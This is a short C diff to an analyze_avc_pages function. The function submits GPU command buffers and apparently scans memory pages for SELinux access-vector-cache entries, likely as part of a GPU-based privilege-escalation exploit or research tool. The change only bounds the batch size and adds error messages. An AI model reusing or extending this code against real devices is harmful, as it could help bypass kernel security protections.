@@ -362,8 +362,13 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     if (nodes_per_page == 0) return 0;
 
     while (idx < npages) {
+        int max_nodes_per_batch = (0x10000 - 256) / (4 * 6 * 4);
+        if (max_nodes_per_batch < 1) max_nodes_per_batch = 1;
+        int max_pages = max_nodes_per_batch / nodes_per_page;
+        if (max_pages < 1) max_pages = 1;
         int batch = npages - idx;
-        if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
+        if (batch > max_pages) batch = max_pages;
+
         int node_dws = batch * nodes_per_page * 4;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, node_dws * 4);
@@ -385,9 +390,19 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
             }
         }
         cmd[dw++] = cp_type7(CP_NOP, 0);
+        if (dw * 4 > 0x10000) {
+            printf("[-] Command buffer overflow! dw=%d\n", dw);
+            return total_nodes;
+        }
         __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(ctx_id, ts) < 0) break;
+        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
+            printf("[-] submit_ib failed\n");
+            break;
+        }
+        if (wait_timestamp(ctx_id, ts) < 0) {
+            printf("[-] wait_timestamp failed\n");
+            break;
+        }
         __sync_synchronize();
 
         for (int p = 0; p < batch; p++) {
